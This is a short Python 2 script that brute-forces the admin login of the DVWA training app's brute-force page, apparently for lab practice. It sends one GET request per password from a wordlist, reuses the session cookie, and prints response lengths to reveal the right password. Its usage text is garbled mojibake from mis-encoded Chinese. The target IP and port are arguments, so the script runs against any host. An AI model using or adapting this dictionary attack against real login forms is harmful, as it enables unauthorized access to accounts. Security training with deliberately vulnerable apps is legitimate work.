import httplib2
import sys



argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "�÷���python",sys.argv[0],"IP��ַ �˿ں�"
    print "���磺urlΪhttp://127.0.0.1:8080/����IP��ַӦΪ127.0.0.1���˿ں�ӦΪ8080"
    sys.exit()

ip = "192.168.109.147"
port = "80"

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	
h=httplib2.Http( )
url="http://"+ip+":"+port+"/DVWA-master/vulnerabilities/brute/"
response,content=h.request(url)
cookie=response["Set-Cookie"]
header={"cookie":cookie}
filepasswords=open("dict.txt","r")
passwords=filepasswords.readlines()
for password in passwords:
    tmp=url+"?username=admin"+"&password="+password[:-1]+"&Login=Login"
    res,content=h.request(tmp,"GET","",header)
    print res["content-length"]+":"+"admin"+":"+password[:-1]+"\n"
    
